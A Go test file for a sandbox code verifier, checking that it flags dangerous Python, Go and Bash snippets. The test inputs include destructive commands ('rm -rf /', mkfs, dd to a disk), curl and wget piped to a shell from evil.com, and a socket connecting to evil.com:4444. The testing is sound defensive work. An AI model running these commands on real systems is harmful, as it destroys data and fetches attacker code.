package sandbox

import (
	"strings"
	"testing"
)

func TestNewCodeVerifier(t *testing.T) {
	cv := NewCodeVerifier()
	if cv == nil {
		t.Fatal("NewCodeVerifier returned nil")
	}
	if len(cv.BlockedModules) == 0 {
		t.Error("expected default blocked modules")
	}
	if len(cv.BlockedFunctions) == 0 {
		t.Error("expected default blocked functions")
	}
	if len(cv.BlockedPatterns) == 0 {
		t.Error("expected default blocked patterns")
	}
	if len(cv.AllowedPaths) == 0 {
		t.Error("expected default allowed paths")
	}
}

func TestVerifyPython_Safe(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
import json
import math

def calculate(x, y):
    return math.sqrt(x**2 + y**2)

result = calculate(3, 4)
print(json.dumps({"result": result}))
`
	result := cv.Verify(code, "python")
	if !result.Safe {
		t.Errorf("expected safe code, got violations: %v", result.Violations)
	}
	if result.Language != "python" {
		t.Errorf("expected language=python, got %s", result.Language)
	}
}

func TestVerifyPython_Eval(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
x = input("Enter expression: ")
result = eval(x)
print(result)
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses eval()")
	}
	found := false
	for _, v := range result.Violations {
		if v.Type == "blocked_function" && strings.Contains(v.Reason, "eval") {
			found = true
			if v.Line != 3 {
				t.Errorf("expected violation on line 3, got %d", v.Line)
			}
		}
	}
	if !found {
		t.Error("expected a blocked_function violation for eval()")
	}
}

func TestVerifyPython_OsSystem(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
import os
os.system("rm -rf /")
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses os.system()")
	}
	found := false
	for _, v := range result.Violations {
		if v.Type == "blocked_module" && strings.Contains(v.Reason, "os.system") {
			found = true
		}
	}
	if !found {
		t.Error("expected blocked_module violation for os.system()")
	}
}

func TestVerifyPython_SubprocessShell(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
import subprocess
subprocess.call("ls -la", shell=True)
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses subprocess.call with shell=True")
	}
}

func TestVerifyPython_Pickle(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
import pickle
data = pickle.loads(user_input)
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses pickle.loads()")
	}
	found := false
	for _, v := range result.Violations {
		if strings.Contains(v.Reason, "pickle") {
			found = true
		}
	}
	if !found {
		t.Error("expected violation for pickle.loads()")
	}
}

func TestVerifyPython_Import(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
mod = __import__("os")
mod.system("whoami")
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses __import__()")
	}
}

func TestVerifyGo_Safe(t *testing.T) {
	cv := NewCodeVerifier()
	code := `package main

import (
	"fmt"
	"strings"
)

func main() {
	fmt.Println(strings.ToUpper("hello"))
}
`
	result := cv.Verify(code, "go")
	if !result.Safe {
		t.Errorf("expected safe code, got violations: %v", result.Violations)
	}
}

func TestVerifyGo_UnsafeImport(t *testing.T) {
	cv := NewCodeVerifier()
	code := `package main

import (
	"fmt"
	"unsafe"
)

func main() {
	x := 42
	p := unsafe.Pointer(&x)
	fmt.Println(p)
}
`
	result := cv.Verify(code, "go")
	if result.Safe {
		t.Error("expected unsafe, code imports unsafe package")
	}
	found := false
	for _, v := range result.Violations {
		if v.Type == "blocked_module" && v.Code == "unsafe" {
			found = true
		}
	}
	if !found {
		t.Error("expected blocked_module violation for unsafe import")
	}
}

func TestVerifyGo_SyscallImport(t *testing.T) {
	cv := NewCodeVerifier()
	code := `package main

import "syscall"

func main() {
	syscall.Kill(1, 9)
}
`
	result := cv.Verify(code, "go")
	if result.Safe {
		t.Error("expected unsafe, code imports syscall package")
	}
}

func TestVerifyGo_ExecCommand(t *testing.T) {
	cv := NewCodeVerifier()
	code := `package main

import (
	"os/exec"
)

func run(cmd string) {
	exec.Command("bash", "-c", cmd)
}
`
	result := cv.Verify(code, "go")
	if result.Safe {
		t.Error("expected unsafe, code uses exec.Command")
	}
	found := false
	for _, v := range result.Violations {
		if v.Type == "system_call" && v.Code == "exec.Command" {
			found = true
		}
	}
	if !found {
		t.Error("expected system_call violation for exec.Command")
	}
}

func TestVerifyGo_OsExit(t *testing.T) {
	cv := NewCodeVerifier()
	code := `package main

import "os"

func cleanup() {
	os.Exit(1)
}
`
	result := cv.Verify(code, "go")
	// os.Exit produces a warning, not an error.
	if !result.Safe {
		// It should be safe since os.Exit is a warning.
		// Check that it's indeed a warning.
		allWarnings := true
		for _, v := range result.Violations {
			if v.Severity != "warning" {
				allWarnings = false
			}
		}
		if !allWarnings {
			t.Error("expected os.Exit to produce only warnings")
		}
	}
	found := false
	for _, v := range result.Violations {
		if v.Code == "os.Exit" && v.Severity == "warning" {
			found = true
		}
	}
	if !found {
		t.Error("expected warning for os.Exit")
	}
}

func TestVerifyBash_Safe(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
echo "Hello, world!"
ls -la
cat /etc/hostname
`
	result := cv.Verify(code, "bash")
	if !result.Safe {
		t.Errorf("expected safe code, got violations: %v", result.Violations)
	}
}

func TestVerifyBash_RmRf(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
rm -rf /
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code uses rm -rf /")
	}
}

func TestVerifyBash_Sudo(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
sudo apt-get install something
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code uses sudo")
	}
	found := false
	for _, v := range result.Violations {
		if strings.Contains(v.Reason, "sudo") {
			found = true
		}
	}
	if !found {
		t.Error("expected violation mentioning sudo")
	}
}

func TestVerifyBash_Chmod777(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
chmod 777 /etc/passwd
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code uses chmod 777")
	}
}

func TestVerifyBash_CurlPipeShell(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
curl http://evil.com/script.sh | sh
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code pipes curl to sh")
	}
}

func TestVerifyBash_Mkfs(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
mkfs.ext4 /dev/sda1
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code uses mkfs")
	}
}

func TestVerifyBash_Dd(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
dd if=/dev/zero of=/dev/sda bs=1M
`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code uses dd to device")
	}
}

func TestVerifyBash_Comments(t *testing.T) {
	cv := NewCodeVerifier()
	code := `#!/bin/bash
# sudo rm -rf /
# This is just a comment about chmod 777
echo "safe"
`
	result := cv.Verify(code, "bash")
	if !result.Safe {
		t.Errorf("expected safe, comments should be ignored, got violations: %v", result.Violations)
	}
}

func TestAddBlockedModule(t *testing.T) {
	cv := NewCodeVerifier()
	initial := len(cv.BlockedModules)
	cv.AddBlockedModule("requests")
	if len(cv.BlockedModules) != initial+1 {
		t.Error("AddBlockedModule did not add module")
	}
	if cv.BlockedModules[len(cv.BlockedModules)-1] != "requests" {
		t.Error("added module not found at end of list")
	}
}

func TestAddBlockedFunction(t *testing.T) {
	cv := NewCodeVerifier()
	initial := len(cv.BlockedFunctions)
	cv.AddBlockedFunction("dangerous_fn")
	if len(cv.BlockedFunctions) != initial+1 {
		t.Error("AddBlockedFunction did not add function")
	}
}

func TestAddBlockedPattern_Valid(t *testing.T) {
	cv := NewCodeVerifier()
	initial := len(cv.BlockedPatterns)
	err := cv.AddBlockedPattern(`dangerous_call\(`)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cv.BlockedPatterns) != initial+1 {
		t.Error("AddBlockedPattern did not add pattern")
	}
}

func TestAddBlockedPattern_Invalid(t *testing.T) {
	cv := NewCodeVerifier()
	err := cv.AddBlockedPattern(`[invalid`)
	if err == nil {
		t.Error("expected error for invalid regex pattern")
	}
}

func TestFormatResult_Safe(t *testing.T) {
	result := &VerificationResult{
		Safe:     true,
		Language: "python",
	}
	output := FormatResult(result)
	if !strings.Contains(output, "SAFE") {
		t.Error("expected SAFE in output")
	}
	if !strings.Contains(output, "No violations") {
		t.Error("expected 'No violations' in output")
	}
}

func TestFormatResult_Unsafe(t *testing.T) {
	result := &VerificationResult{
		Safe:     false,
		Language: "python",
		Violations: []Violation{
			{
				Type:     "blocked_module",
				Line:     3,
				Code:     "subprocess.call(cmd, shell=True)",
				Reason:   `blocked module "subprocess" with shell=True`,
				Severity: "error",
			},
			{
				Type:     "dangerous_pattern",
				Line:     7,
				Code:     "os.system(cmd)",
				Reason:   "dangerous pattern: os.system() call",
				Severity: "error",
			},
			{
				Type:     "file_access",
				Line:     12,
				Code:     "open('/etc/passwd', 'w')",
				Reason:   "file write outside allowed paths",
				Severity: "warning",
			},
		},
		Warnings: []string{"file write outside allowed paths"},
	}
	output := FormatResult(result)

	if !strings.Contains(output, "UNSAFE") {
		t.Error("expected UNSAFE in output")
	}
	if !strings.Contains(output, "L3:") {
		t.Error("expected L3: in output")
	}
	if !strings.Contains(output, "L7:") {
		t.Error("expected L7: in output")
	}
	if !strings.Contains(output, "execution blocked") {
		t.Error("expected 'execution blocked' in output")
	}
	if !strings.Contains(output, "2 violations") {
		t.Error("expected '2 violations' in output")
	}
	if !strings.Contains(output, "1 warning") {
		t.Error("expected '1 warning' in output")
	}
}

func TestFormatResult_SingleViolation(t *testing.T) {
	result := &VerificationResult{
		Safe:     false,
		Language: "bash",
		Violations: []Violation{
			{
				Type:     "system_call",
				Line:     2,
				Code:     "rm -rf /",
				Reason:   "rm -rf / will destroy the entire filesystem",
				Severity: "error",
			},
		},
	}
	output := FormatResult(result)
	if !strings.Contains(output, "1 violation") {
		t.Error("expected '1 violation' (singular)")
	}
	// Should NOT have "violations" (plural)
	if strings.Contains(output, "1 violations") {
		t.Error("should use singular 'violation' for count 1")
	}
}

func TestVerify_UnknownLanguage(t *testing.T) {
	cv := NewCodeVerifier()
	code := `os.system("whoami")`
	result := cv.Verify(code, "ruby")
	// Should still catch the pattern via generic matching.
	if result.Safe {
		t.Error("expected generic pattern matching to catch os.system()")
	}
}

func TestVerify_ConcurrentAccess(t *testing.T) {
	cv := NewCodeVerifier()
	done := make(chan struct{})

	// Run concurrent verifications.
	for i := 0; i < 10; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			cv.Verify("eval(x)", "python")
		}()
	}

	// Run concurrent additions.
	for i := 0; i < 5; i++ {
		go func() {
			defer func() { done <- struct{}{} }()
			cv.AddBlockedModule("test_module")
		}()
	}

	for i := 0; i < 15; i++ {
		<-done
	}
}

func TestVerifyPython_ExecFunction(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
code_str = "print('hello')"
exec(code_str)
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code uses exec()")
	}
}

func TestVerifyGo_InvalidSyntax(t *testing.T) {
	cv := NewCodeVerifier()
	// Invalid Go code should fall back to generic pattern matching.
	code := `this is not valid Go code
os.system("something")
`
	result := cv.Verify(code, "go")
	// Should still detect patterns via fallback.
	if result.Safe {
		t.Error("expected generic pattern match on invalid Go code")
	}
}

func TestVerifyBash_WgetPipeShell(t *testing.T) {
	cv := NewCodeVerifier()
	code := `wget http://evil.com/payload | bash`
	result := cv.Verify(code, "bash")
	if result.Safe {
		t.Error("expected unsafe, code pipes wget to bash")
	}
}

func TestVerifyPython_NetworkSocket(t *testing.T) {
	cv := NewCodeVerifier()
	code := `
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 4444))
`
	result := cv.Verify(code, "python")
	if result.Safe {
		t.Error("expected unsafe, code creates raw socket")
	}
	found := false
	for _, v := range result.Violations {
		if v.Type == "network_access" {
			found = true
		}
	}
	if !found {
		t.Error("expected network_access violation")
	}
}
